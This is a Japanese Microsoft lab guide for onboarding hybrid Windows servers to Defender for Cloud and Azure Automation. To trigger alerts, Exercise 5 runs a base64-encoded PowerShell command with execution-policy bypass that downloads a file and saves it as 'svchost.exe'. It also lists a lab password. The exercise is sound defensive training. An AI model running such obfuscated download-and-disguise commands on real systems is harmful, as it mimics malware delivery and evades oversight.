---
lab:
  title: 'ラボ: ハイブリッド シナリオでのセキュリティ ソリューションの実装'
  module: 'Module 2: Implementing Security Solutions in Hybrid Scenarios'
ms.openlocfilehash: 475c539c6792c3a50a41c27ec5c293e895f0f07a
ms.sourcegitcommit: fb0d39e25bc0fe182037587b772d217db126d3bb
ms.translationtype: HT
ms.contentlocale: ja-JP
ms.lasthandoff: 05/07/2022
ms.locfileid: "144812992"
---
# <a name="lab-implementing-security-solutions-in-hybrid-scenarios"></a>ラボ: ハイブリッド シナリオでのセキュリティ ソリューションの実装

## <a name="scenario"></a>シナリオ

オンプレミスとクラウドのセキュリティ環境をさらに強化できる Microsoft Azure のセキュリティ関連の統合機能を特定するために、概念実証環境の Windows サーバーを Microsoft Defender for Cloud にオンボードすることにしました。 また、Windows Server を実行しているオンプレミスのサーバーと Azure VM を、インベントリ、変更の追跡、更新管理などの Azure Automation ベースのソリューションと統合する必要があります。

## <a name="objectives"></a>目標

このラボを完了すると、次のことができるようになります。

- Azure Log Analytics ワークスペースと Azure Automation アカウントを作成する。
- Defender for Cloud を構成する。
- Windows Server を実行する Azure VM をプロビジョニングする。
- オンプレミスの Windows Server を Defender for Cloud と Azure Automation にオンボードする。
- Defender for Cloud と Azure Automation のソリューションのハイブリッド機能を確認する。

## <a name="estimated-time-75-minutes"></a>予想所要時間: 75 分

## <a name="lab-setup"></a>ラボのセットアップ

仮想マシン: **AZ-801T00A-SEA-DC1**、**AZ-801T00A-SEA-SVR1**、**AZ-801T00A-SEA-SVR2** が実行されている必要があります。 他の VM が実行されていてもかまいませんが、このラボでは必要ありません。

> **注**: **AZ-801T00A-SEA-DC1**、**AZ-801T00A-SEA-SVR1**、**AZ-801T00A-SEA-SVR2** 仮想マシンは、それぞれ **SEA-DC1**、**SEA-SVR1**、および **SEA-SVR2** のインストールをホストしています。

1. **[SEA-SVR2]** を選択します。
1. 次の資格情報を使用してサインインします。

   - ユーザー名: **Administrator**
   - パスワード: **Pa55w.rd**
   - ドメイン: **CONTOSO**

このラボでは、使用可能な VM 環境と Azure サブスクリプションを使用します。 ラボを開始する前に、Azure サブスクリプションと、そのサブスクリプションの所有者または共同作成者ロールを持つユーザー アカウントがあることを確認してください。

## <a name="exercise-1-creating-an-azure-log-analytics-workspace-and-an-azure-automation-account"></a>演習 1: Azure Log Analytics ワークスペースと Azure Automation アカウントを作成する

### <a name="scenario"></a>シナリオ

評価を準備するには、まず、インベントリ、変更の追跡、更新管理など、セキュリティ関連のソリューションのコア機能を提供する Azure Log Analytics ワークスペースと Azure Automation アカウントを作成します。

この演習の主なタスクは次のとおりです。

1. Azure Log Analytics ワークスペースを作成する 
1. Azure Automation アカウントを作成して構成する

#### <a name="task-1-create-an-azure-log-analytics-workspace"></a>タスク 1: Azure Log Analytics ワークスペースを作成する 

1. **SEA-SVR2** で Microsoft Edge を起動し、 **[Azure portal](https://portal.azure.com)** に移動し、このラボで使用するサブスクリプションの所有者ロールをもつユーザー アカウントの資格情報を使用してサインインします。
1. Azure portal から、次の設定を使用して Log Analytics ワークスペースを作成します。

   | 設定 | 値 |
   | --- | --- |
   | サブスクリプション | このラボで使用している Azure サブスクリプションの名前 |
   | リソース グループ | 新しいリソース グループの名前 **AZ801-L0201-RG** |
   | Log Analytics ワークスペース | 任意の一意の名前 |
   | リージョン | 前のタスクで仮想マシンをデプロイした Azure リージョンの名前 |

   >**注**: デプロイが完了するまで待ちます。 デプロイには約 1 分かかります。

#### <a name="task-2-create-and-configure-an-azure-automation-account"></a>タスク 2: Azure Automation アカウントを作成して構成する

1. **SEA-SVR2** 上の Azure portal で、次の設定を使用して Azure Automation アカウントを作成します。

   | 設定 | 値 |
   | --- | --- |
   | サブスクリプション | このラボで使用している Azure サブスクリプションの名前 |
   | リソース グループ | **AZ801-L0201-RG** |
   | 名前 | 任意の一意の名前 |
   | リージョン | [ワークスペース マッピングに関するドキュメント](https://docs.microsoft.com/en-us/azure/automation/how-to/region-mappings)に基づいて決定された Azure リージョンの名前 |

   >**注**: [ワークスペース マッピングのドキュメント](https://docs.microsoft.com/en-us/azure/automation/how-to/region-mappings)に基づいて、Azure リージョンを指定してください。

   >**注**: デプロイが完了するまで待ちます。 デプロイには約 3 分かかります。

1. Azure portal で、新しく作成した Azure Automation アカウントを参照します。 
1. **[Automation アカウント]** ページで、その **[インベントリ]** ページを参照します。
1. **[インベントリ]** ページで、このタスクで前に作成した Log Analytics ワークスペースにソリューションを関連付けて有効にします。

   >**注**: 対応する Log Analytics ソリューションのインストールが完了するまで待ちます。 これには 3 分ほどかかる場合があります。 

   >**注**: これにより、**変更の追跡** ソリューションも自動的にインストールされます。

1. **[Automation アカウント]** ページで、その **[Update Management]** ページを参照します。
1. **[Automation アカウント]** ページで、このタスクで前に作成した Log Analytics ワークスペースにソリューションを関連付けて有効にします。

   >**注**: インストールが完了するまで待ちます。 これには 5 分ほどかかる場合があります。

## <a name="exercise-2-configuring-microsoft-defender-for-cloud"></a>演習 2: Microsoft Defender for Cloud の構成

### <a name="scenario"></a>シナリオ

次に、Defender for Cloud によって提供される強化されたセキュリティ機能を利用できるようにする必要があります。 これにより、Windows Server のハイブリッド シナリオに適用される機能を適切に評価できます。

この演習の主なタスクは次のとおりです。

1. Defender for Cloud とエージェントの自動インストールを有効にする。
1. Defender for Cloud のセキュリティ強化を有効にする。

#### <a name="task-1-enable-defender-for-cloud-and-automatic-agent-installation"></a>タスク 1: Defender for Cloud とエージェントの自動インストールを有効にする

このタスクでは、Azure サブスクリプションに接続し、Defender for Cloud の強化されたセキュリティ機能を有効にします。

1. **SEA-SVR2** の Azure portal で、 **[Microsoft Defender for Cloud]** ページを参照します。
1. サブスクリプションを Defender for Cloud にアップグレードし、エージェントの自動インストールを有効にします。 

   > **注:** ご使用のサブスクリプションでは、Defender for Cloud のセキュリティ強化が既に有効になっている可能性があります。その場合は、次のタスクに進みます。

#### <a name="task-2-enable-enhanced-security-of-defender-for-cloud"></a>タスク 2: Defender for Cloud のセキュリティ強化を有効にする

このタスクでは、Defender for Cloud のセキュリティ強化を有効にします。

1. **SEA-SVR2** の Azure portal を表示している Microsoft Edge ウィンドウで、 **[Microsoft Defender for Cloud | 概要]** ページから **[環境設定]** ページを参照します。
1. **[環境設定]** ページ で、Azure サブスクリプションで利用可能な Defender for Cloud のプランを確認します。

   > **注:** 同じページに記載されている個々の Microsoft Defender プランを選択的に無効にできることに注意してください。

1. **Microsoft Defender for Servers** プランを有効にします。 
1. **[設定 \| 自動プロビジョニング]** ページを参照します。 
1. 拡張機能の一覧で、次のタスクを実行します。

   - 前の演習で作成した Log Analytics ワークスペースを利用して、**Log Analytics agent for Azure VMs** を有効にする。
   - 前の演習で作成した Log Analytics ワークスペースを利用して、**Log Analytics agent for Azure Arc Machine (プレビュー)** を有効にする。
   - **Microsoft 脅威と脆弱性の管理** オプションを使用して、**マシンの脆弱性評価** を有効にする。


1. Defender for Cloud の **[Cloud Environment settings]\(クラウド環境の設定\)** ページを参照します。
1. **[環境設定]** ページで、Azure サブスクリプションを表すエントリを展開し、前の演習で作成した Log Analytics ワークスペースを表すエントリを確認します。
1. **[設定 \| Defender プラン]** ページで、ワークスペースで使用可能なすべての Defender for Cloud プランを有効にします。

   > **注:** 脅威保護機能を含むすべての Defender for Cloud 機能を有効にするには、該当するワークロードを含むサブスクリプションで、強化されたセキュリティ機能を有効にする必要があります。 ワークスペース レベルで有効にしても、Just-In-Time VM アクセス、適応型アプリケーション制御、Azure リソースのネットワーク検出は有効になりません。 さらに、ワークスペース レベルで使用できる Microsoft Defender プランは、Microsoft Defender for servers と Microsoft Defender for SQL servers on machines のみです。

1. 前の演習で作成したワークスペースで、**データ コレクション** のスコープを **[すべてのイベント]** に設定します。

   > **注:** Defender for Cloud でデータ コレクションのレベルを選択することは、Log Analytics ワークスペースでのセキュリティ イベントのストレージにのみ影響します。 ワークスペースに保存するように選択したセキュリティ イベントのレベルに関係なく、Log Analytics エージェントでは、Defender for Cloud の脅威保護に必要なセキュリティ イベントが引き続き収集され、分析されます。 セキュリティ イベントを保存することを選択すると、ワークスペース内でそれらのイベントの調査、検索、監査が可能になります。

## <a name="exercise-3-provisioning-azure-vms-running-windows-server"></a>演習 3: Windows Server を実行する Azure VM のプロビジョニング

### <a name="scenario"></a>シナリオ

ハイブリッド シナリオで Defender for Cloud の機能をテストする必要があります。これには、Windows Server を実行している Azure VM 向けの利点も含まれます。 そのためには、Azure Resource Manager テンプレートを使用して、Windows Server を実行する Azure VM をプロビジョニングします。

この演習の主なタスクは次のとおりです。

1. Azure Cloud Shell を起動します。
1. Azure Resource Manager テンプレートを使用して Azure VM をデプロイする。

#### <a name="task-1-start-azure-cloud-shell"></a>タスク 1: Azure Cloud Shell を起動する

このタスクでは、Azure Cloud Shell を起動します。

1. **SEA-SVR2** の Azure portal の [Azure Cloud Shell] ペインで、PowerShell セッションを開きます。
1. Cloud Shell を開始するのが初めての場合は、そのデフォルトの構成設定を受け入れます。

#### <a name="task-2-deploy-an-azure-vm-by-using-an-azure-resource-manager-template"></a>タスク 2: Azure Resource Manager テンプレートを使用して Azure VM をデプロイする

このタスクでは、Azure Resource Manager テンプレートを使用して Azure VM をデプロイします。

1. **SEA-SVR2** 上の Azure portal の [Cloud Shell] ウィンドウで、ファイル **C:\\Labfiles\\Lab02\\L02-sub_template.json**、**C:\\Labfiles\\Lab02\\L02-rg_template.json**、**C:\\Labfiles\\Lab02\\L02-rg_template.parameters.json** を Cloud Shell のホーム ディレクトリにアップロードします。
1. ラボ環境をホストするリソース グループを作成するために、Cloud Shell ウィンドウの **PowerShell** セッションで、次のコマンドを実行します (`<Azure_region>` プレースホルダーを、このラボでリソースをデプロイする Azure リージョンの名前に置き換えます)。

   >**注**: **(Get-AzLocation).Location** コマンドを使用して、使用可能な Azure リージョンの名前を一覧表示できます。

   ```powershell 
   $location = '<Azure_region>'
   New-AzSubscriptionDeployment -Location $location -Name az801l2001deployment -TemplateFile ./L02-sub_template.json -rgLocation $location -rgName 'AZ801-L0202-RG'
   ```

1. 新しく作成したリソース グループに Azure 仮想マシンをデプロイするには、次のコマンドを実行します。

   ```powershell 
   New-AzResourceGroupDeployment -Name az801l2002deployment -ResourceGroupName AZ801-L0202-RG -TemplateFile ./L02-rg_template.json -TemplateParameterFile ./L02-rg_template.parameters.json
   ```

   >**注**: デプロイが完了するまで待ちます。 これには 3 分ほどかかります。

1. Cloud Shell を閉じます。

## <a name="exercise-4-onboarding-on-premises-windows-server-into-microsoft-defender-for-cloud-and-azure-automation"></a>演習 4: オンプレミスの Windows Server を Microsoft Defender for Cloud および Azure Automation にオンボードする

### <a name="scenario"></a>シナリオ

**SEA-SVR1** と **SEA-SVR2** を Defender for Cloud にオンボードして、オンプレミス環境で実行されているサーバーのセキュリティを強化するために使用できる Defender for Cloud の機能を決定します。

この演習の主なタスクは次のとおりです。

1. Log Analytics エージェントの手動インストールを実行する。
1. Log Analytics エージェントの無人インストールを実行する。
1. Azure VM 向けの Azure Automation ソリューションを有効にする。
1. オンプレミス サーバー向けの Azure Automation ソリューションを有効にする。

#### <a name="task-1-perform-manual-installation-of-the-log-analytics-agent"></a>タスク 1: Log Analytics エージェントの手動インストールを実行する

このタスクでは、Log Analytics エージェントの手動インストールを実行します。

1. **SEA-SVR2** の Azure portal を表示している Microsoft Edge ウィンドウで、Defender for Cloud の **[Microsoft Defender for Cloud \| インベントリ]** ページを参照します。
1. **[Microsoft Defender for Cloud \| インベントリ]** ページで、 **[+ 非 Azure サーバーの追加]** を選択します。
1. **[Defender for Cloud へのサーバーのオンボード]** ページで、Log Analytics ワークスペース **az801-l02-workspace** をアップグレードします。

   > **注:** アップグレードが正常に完了すると、 **[アップグレード]** ボタンのラベルが **[+ サーバーの追加]** に変わります。

1. **[+ サーバーの追加]** ボタンを使用して **[az801-l02-workspace \| エージェント管理]** ページを参照します。そこから Log Analytics エージェントのインストーラーをダウンロードし、エージェントのインストールを完了するために必要なワークスペース ID とキーを識別できます。
1. **[az801-l02-workspace \| エージェント管理]** ページで、 **[ワークスペース ID]** と **[プライマリ キー]** の値を記録します。 これらはこのタスクの後半で必要になります。
1. **[az801-l02-workspace \| エージェント管理]** ページから、Windows エージェント (64 ビット) をダウンロードします。
1. ダウンロードした実行可能ファイルを使用して、 **[Microsoft Monitoring Agent のセットアップ]** ウィザードを起動します。
1. **[Microsoft Monitoring Agent のセットアップ]** ウィザードの **[Azure Log Analytics]** ページで、このタスクで前に記録した **ワークスペース ID** と **プライマリ キー** の値を入力し、既定の設定を使用して Microsoft Monitoring Agent のインストールを完了します。

#### <a name="task-2-perform-unattended-installation-of-the-log-analytics-agent"></a>タスク 2: Log Analytics エージェントの無人インストールを実行する

このタスクでは、Log Analytics エージェントの無人インストールを実行します。

1. **SEA-SVR2** で、管理者として **Windows PowerShell** を起動します。
1. **MMASetup-AMD64.exe** ファイルの内容を抽出するために、**Windows PowerShell** コンソールで次のコマンドを実行します。
    
   ```powershell
   New-Item -ItemType Directory -Path 'C:\Labfiles\L02\' -Force
   Copy-Item -Path $env:USERPROFILE\Downloads\MMASetup-amd64.exe -Destination 'C:\Labfiles\L02\' -Force
   Set-Location -Path C:\Labfiles\L02
   .\MMASetup-amd64.exe /c /t:C:\Labfiles\L02
   Remove-Item -Path .\MMASetup-amd64.exe
   ```

1. インストール ファイルをターゲットの **SEA-SVR1** にコピーするために、**Windows PowerShell** コンソールで次のコマンドを実行します。
    
   ```powershell
   New-Item -ItemType Directory -Path '\\SEA-SVR1\c$\Labfiles\L02' -Force
   Copy-Item -Path 'C:\Labfiles\L02\*' -Destination '\\SEA-SVR1\c$\Labfiles\L02' -Recurse -Force
   ```

1. **SEA-SVR1** で Log Analytics エージェントのインストールを実行するために、**Windows PowerShell** コンソールで次のコマンドを実行します (`<WorkspaceID>` と `<PrimaryKey>` の各プレースホルダーを、この演習の前のタスクで記録した **ワークスペース ID** と **ワークスペース キー** の値に置き換えます)。

   ```powershell
   Invoke-Command -ComputerName SEA-SVR1.contoso.com -ScriptBlock { Start-Process -FilePath C:\Labfiles\L02\setup.exe -ArgumentList '/qn NOAPM=1 ADD_OPINSIGHTS_WORKSPACE=1 OPINSIGHTS_WORKSPACE_AZURE_CLOUD_TYPE=0 OPINSIGHTS_WORKSPACE_ID="<WorkspaceID>" OPINSIGHTS_WORKSPACE_KEY="<PrimaryKey>" AcceptEndUserLicenseAgreement=1' -Wait }
   ```

   > **注**: インストールが完了するまで待ちます。 これには 1 分ほどかかります。

#### <a name="task-3-enable-azure-automation-solutions-for-azure-vms"></a>タスク 3: Azure VM 向けの Azure Automation ソリューションを有効にする

1. **SEA-SVR2** で、Azure portal が表示されている Microsoft Edge ウィンドウに切り替え、このラボで前にプロビジョニングした Azure Automation アカウントのページを参照します。 
1. [Automation アカウント] ページで、その **[インベントリ]** ページを参照します。
1. **[インベントリ]** ページ で、ツール バーの **[+ Azure VM の追加]** ボタンを使用して、**az801l02-vm0** Azure VM のインベントリと変更の追跡を有効にします。 

   > **注:** この VM が **[有効にする準備ができました]** としてリストされるためには、Automation アカウント ソリューションに関連付けられている Log Analytics ワークスペースに接続されている必要があります。

1. Automation アカウントの **[更新管理]** ページを参照します。
1. **[更新管理]** ページで、ツール バーの **[+ Azure VM の追加]** ボタンを使用して、**az801l02-vm0** Azure VM の更新管理を有効にします。 

   > **注:** インベントリ ソリューションの場合と同様に、この VM が **[有効にする準備ができました]** としてリストされるためには、Automation アカウント ソリューションに関連付けられている Log Analytics ワークスペースに接続されている必要があります。

   > **注:** オンプレミスの VM は、Log Analytics エージェントをインストールし、この演習の前のタスクで実行したインベントリ、変更の追跡、更新管理ソリューションをホストする Azure Automation アカウントに関連付けられている Azure Log Analytics ワークスペースに登録した結果、オンボードされます。

#### <a name="task-4-enable-azure-automation-solutions-for-on-premises-servers"></a>タスク 4: オンプレミス サーバー向けの Azure Automation ソリューションを有効にする

1. **SEA-SVR2** の Azure portal が表示されている Microsoft Edge ウィンドウで、このラボで前にプロビジョニングした **Azure Automation アカウント** のページを参照します。 
1. **[Automation アカウント]** ページで、その **[インベントリ]** ページを参照します。
1. **[インベントリ]** ページで、 **[クリックしてマシンを管理します]** リンクを使用して、オンプレミス サーバーのインベントリと変更の追跡を有効にします。

   > **注:** このオプションは、Log Analytics エージェントがインストールされ、インベントリ、変更の追跡、更新管理ソリューションをホストしている Azure Automation アカウントに関連付けられている Azure Log Analytics ワークスペースに登録されているオンプレミス サーバーに適用されます。

1. Automation アカウントの **[更新管理]** ページを参照します。
1. **[更新管理]** ページで、 **[クリックしてマシンを管理します]** リンクを使用して、オンプレミス サーバーの更新管理を有効にします。

   > **注:** インベントリおよび変更の管理ソリューションの場合と同様に、このオプションは、Log Analytics エージェントがインストールされ、インベントリ、変更の追跡、更新管理ソリューションをホストしている Azure Automation アカウントに関連付けられている Azure Log Analytics ワークスペースに登録されているオンプレミス サーバーに適用されます。

## <a name="exercise-5-verifying-the-hybrid-capabilities-of-microsoft-defender-for-cloud-and-azure-automation-solutions"></a>演習 5: Microsoft Defender for Cloud と Azure Automation ソリューションのハイブリッド機能を確認する

### <a name="scenario"></a>シナリオ

Windows Server を実行しているオンプレミスのサーバーと Azure VM が混在しているため、両方のケースで使用できる Defender for Cloud と Azure Automation のセキュリティ関連ソリューションの機能を検証する必要があります。 両方のリソースに対するサイバー攻撃をシミュレートし、Defender for Cloud でアラートを確認します。

この演習の主なタスクは次のとおりです。

1. Azure VM の脅威検出機能を検証する。
1. オンプレミス サーバーの脅威検出機能を検証する。
1. ハイブリッド シナリオに適用される機能を確認する。
1. Azure Automation のソリューションを検証する。

#### <a name="task-1-validate-threat-detection-capabilities-for-azure-vms"></a>タスク 1: Azure VM の脅威検出機能を検証する

このタスクでは、Azure VM の脅威検出機能を検証します。

1. **SEA-SVR2** の Azure portal が表示されている Microsoft Edge ウィンドウで、**az801l02-vm0** 仮想マシンのページを参照します。
1. **[az801l02-vm0]** ページで、**コマンドの実行** 機能を使用して次の PowerShell コマンドを実行し、脅威検出アラートをトリガーします。

   ```powershell
   New-Item -ItemType Directory -Path 'C:\Temp' -Force
   Start-Process -FilePath powershell.exe -ArgumentList '-nop -exec bypass -EncodedCommand "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwBvAG0AbQBhAG4AZAAgACIAJgAgAHsAIABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBkAG8AdwBuAGwAbwBhAGQALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAC8AZgBpAGwAZQBzAC8AUwB5AHMAbQBvAG4ALgB6AGkAcAAgAC0ATwB1AHQARgBpAGwAZQAgAGMAOgBcAHQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAIAB9ACIA"' -Wait
   ```

1. **SEA-ADM1** の Azure portal で、 **[Microsoft Defender for Cloud \| セキュリティ警告]** ページを参照します。
1. **[Microsoft Defender for Cloud \| セキュリティ警告]** ページで、**az801l02-vm0** での PowerShell の疑わしい使用を示す重大度の高いアラートに注目します。
1. セキュリティ警告を選択し、 **[セキュリティ警告]** ページで **[アクションの実行]** を選択し、実行可能なアクションを確認します。

   > **注:** 今後の攻撃の可能性を最小限に抑えるために、セキュリティに関する推奨事項の実装を検討してください。

#### <a name="task-2-validate-the-threat-detection-capabilities-for-on-premises-servers"></a>タスク 2: オンプレミス サーバーの脅威検出機能を検証する

このタスクでは、オンプレミス サーバーの脅威検出機能を検証します。

1. **SEA-ADM1** で、**Windows PowerShell** コンソールに切り替えます。
1. 脅威検出の警告をトリガーするために、**Windows PowerShell** コンソールで、次のコマンドを実行します。
    
   ```powershell
   New-Item -ItemType Directory -Path 'C:\Temp' -Force
   powershell -nop -exec bypass -EncodedCommand "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwBvAG0AbQBhAG4AZAAgACIAJgAgAHsAIABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwBkAG8AdwBuAGwAbwBhAGQALgBzAHkAcwBpAG4AdABlAHIAbgBhAGwAcwAuAGMAbwBtAC8AZgBpAGwAZQBzAC8AUwB5AHMAbQBvAG4ALgB6AGkAcAAgAC0ATwB1AHQARgBpAGwAZQAgAGMAOgBcAHQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUAIAB9ACIA"
   ```

1. **SEA-ADM1** で、Azure portal を表示している Microsoft Edge ウィンドウに切り替え、 **[Microsoft Defender for Cloud \| セキュリティ警告]** ページに戻ります。
1. **[Microsoft Defender for Cloud \| セキュリティ警告]** ページで、**SEA-SVR2** での PowerShell の疑わしい使用を示す重大度の高いアラートに注目します。
1. セキュリティ アラートを選択し、 **[セキュリティ アラート]** ページで **[アクションの実行]** を選択し、実行可能なアクションを確認します。

   > **注:** 今後の攻撃の可能性を最小限に抑えるために、セキュリティに関する推奨事項の実装を検討してください。

#### <a name="task-3-review-the-features-and-capabilities-that-apply-to-hybrid-scenarios"></a>タスク 3: ハイブリッド シナリオに適用される機能を確認する

このタスクでは、ハイブリッド シナリオに適用される Defender for Cloud の機能を確認します。

1. **SEA-SVR2** の Azure portal を表示している Microsoft Edge ウィンドウで、 **[Microsoft Defender for Cloud \| インベントリ]** ページを参照します。
1. **[インベントリ]** ページのリソースの一覧で、**az801l02-vm0** Azure VM、**SEA-SVR1.contoso.com** および **SEA-SVR2.contoso.com** オンプレミス サーバーを表すエントリを識別します。

   > **注:** Azure とオンプレミスの VM を表すエントリが **[インベントリ]** ページに表示されるまでに、数分かかる場合があります。

   > **注:** **az801l02-vm0** が **[監視エージェント]** 列に **[未インストール]** と報告されている場合は、**az801l02-vm0** のリンクを選択します。 **[リソースの正常性 (プレビュー)]** ページで、 **[推奨事項]** を確認し、 **[Log Analytics エージェントは仮想マシンにインストールする必要がある]** エントリを選択します。 **[Log Analytics エージェントを仮想マシンにインストールする必要がある]** ページで、 **[修正]** を選びます。 **[リソースの修正]** ページの **[ワークスペース ID]** ドロップダウン リストから、Defender for Cloud によって作成された既定のワークスペースを選択し、 **[1 個のリソースの修正]** を選択します。 

1. **az801l02-vm0** の **[リソースの正常性 (プレビュー)]** ページを参照し、 **[推奨事項]** を確認します。
1. **SEA-SVR2** の **[リソースの正常性 (プレビュー)]** ページを参照し、 **[推奨事項]** を確認します。

#### <a name="task-4-validate-azure-automation-solutions"></a>タスク 4: Azure Automation のソリューションを検証する

1. **SEA-SVR2** の Azure portal が表示されている Microsoft Edge ウィンドウで、このラボで前にプロビジョニングした Azure Automation アカウントの **[インベントリ]** ページに戻ります。
1. **[インベントリ]** ページで **[マシン]** タブを確認し、このラボの前の手順で Log Analytics ワークスペースに登録した Azure VM とオンプレミス サーバーの両方が含まれていることを確認します。

   >**注**: Azure VM サーバーまたはオンプレミス サーバーのいずれかまたは両方が **[マシン]** タブに表示されていない場合は、もうしばらく待つ必要がある場合があります。

1. **[インベントリ]** ページで、残りのタブ ( **[ソフトウェア]** 、 **[ファイル]** 、 **[Windows レジストリ]** 、 **[Windows サービス]** タブなど) を確認します。

   >**注**: 収集されたデータとファイルは、 **[インベントリ]** ページのツールバーの **[設定の編集]** オプションを使用して構成できます。

   >**注**: これにより、**変更の追跡** ソリューションも自動的にインストールされます。

1. 同じ Azure Automation アカウントの **[変更の追跡]** ページを参照します。 
1. **[イベント]** 、 **[ファイル]** 、 **[レジストリ]** 、 **[ソフトウェア]** 、 **[Windows サービス]** の各エントリに関連付けられている数を確認します。 これらの値が 0 より大きい場合は、対応する変更に関する詳細について、ページの下部にある **[変更]** および **[イベント]** タブで参照できます。

   >**注**: この場合も、追跡される変更は、 **[変更の追跡]** ページのツール バーの **[設定の編集]** オプションを使用して構成できます。

1. 同じ Azure Automation アカウントの **[更新管理]** ページを参照します。
1. **[更新管理]** ページで **[マシン]** タブを確認し、このラボの前の手順で Log Analytics ワークスペースに登録した Azure VM とオンプレミス サーバーの両方が含まれていることを確認します。
1. **[マシン]** タブで各エントリのコンプライアンス状態を確認し、 **[不足している更新プログラム]** タブを参照します。

   >**注**: オンプレミス サーバーと Azure VM の両方に対して、不足している更新プログラムの自動デプロイをスケジュールするオプションがあります。

## <a name="exercise-6-deprovisioning-the-azure-environment"></a>演習 6: Azure 環境のプロビジョニング解除

### <a name="scenario"></a>シナリオ

Azure 関連の料金を最小限に抑えるために、このラボでプロビジョニングした Azure リソースをプロビジョニング解除します。

この演習の主なタスクは次のとおりです。

1. Cloud Shell で PowerShell セッションを開始する。
1. ラボでプロビジョニングされた Azure リソースを特定して削除する。

#### <a name="task-1-start-a-powershell-session-in-cloud-shell"></a>タスク 1: Cloud Shell で PowerShell セッションを開始する

1. **SEA-SVR2** の Azure portal を表示している Microsoft Edge ウィンドウで、Cloud Shell ウィンドウを開きます。

#### <a name="task-2-identify-and-remove-all-azure-resources-that-were-provisioned-in-the-lab"></a>タスク 2: ラボでプロビジョニングされた Azure リソースを特定して削除する

1. Cloud Shell ウィンドウで次のコマンドを実行して、このラボで作成されたすべてのリソース グループの一覧を表示します。

   ```powershell
   Get-AzResourceGroup -Name 'AZ801-L02*'
   ```

   > **注**: 出力に、このラボで作成したリソース グループのみが含まれていることを確認してください。 これらのグループは、このタスクで削除されます。

1. このラボで作成したすべてのリソース グループを削除するために、次のコマンドを実行します。

   ```powershell
   Get-AzResourceGroup -Name 'AZ801-L02*' | Remove-AzResourceGroup -Force -AsJob
   ```

   >**注**: このコマンドは非同期で実行されるため ( *-AsJob* パラメーターによって決定されます)、同じ PowerShell セッション内で直後に別の PowerShell コマンドを実行できますが、リソース グループが実際に削除されるまでに数分かかります。

## <a name="results"></a>結果

このラボを完了すると、次の作業が完了しています。

- Azure Log Analytics ワークスペースと Azure Automation アカウントを作成する。
- Defender for Cloud を構成する。
- Windows Server を実行する Azure VM をプロビジョニングする。
- オンプレミスの Windows Server を Defender for Cloud と Azure Automation にオンボードする。
- Defender for Cloud と Azure Automation のソリューションのハイブリッド機能を確認する。
